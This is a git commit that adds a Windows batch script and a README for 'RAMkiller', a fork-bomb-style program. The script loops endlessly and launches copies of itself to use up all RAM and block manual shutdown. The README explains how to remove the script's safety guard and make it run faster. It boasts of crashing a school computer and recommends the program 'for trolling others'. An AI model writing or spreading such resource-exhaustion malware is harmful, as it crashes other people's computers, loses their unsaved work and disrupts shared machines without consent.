a1ec2e0da793ce56892ea712dd5cf7d4d846fd12
Tien Vu <timothyvu2002@gmail.com>
2016-12-05 12:54:59 -0500

    Add files via upload

---
+++ HandsUp/HandsUp.bat
@@ -0,0 +1,40 @@
+@echo off
+title Matrix
+color 0a
+:1
+
+
+rem READ THESE
+rem To make the program work faster, just copy-paste "start RAMkiller.bat" where it says to farther down
+rem You'll want to delete:
+rem	The "echo" commands below
+rem 	The "pause" command below
+rem 	The "goto 2" command below (you can delete the :2 as well but it won't affect anything
+
+rem You are now ready to go!
+
+echo.
+echo You forgot to delete some lines of code! (including this one!)
+echo.
+echo Right-click the .bat and click edit
+echo You'll be brought to the code so you can fix it.
+echo.
+echo.
+pause
+
+goto 2
+
+type RAMK.txt
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+rem Here's where you'll want to copy-paste "start RAMkiller.bat"
+
+goto 1
+
+:2
---
+++ HandsUp/README.md
@@ -0,0 +1,14 @@
+# RAMkiller
+
+##DO NOT RUN WITHOUT READING THIS
+
+This program is similar to Matrix.bat with a few exceptions... it kills your computer.
+
+Runs Matrix.bat but will open itself up constantly preventing manual shutdown of the program and eventual use of all RAM on the computer
+<br>Dropped my school comp in a minute >:D (School computers are pretty bad)
+
+###You'll need to right-click the file and press edit before you can use it. There is further explanation in the program.
+<br>You can also make it work faster, more explanation in the program.
+
+Can be used for trolling others or when you're bored, don't credit me though. Only thing I don't want credit for.
+
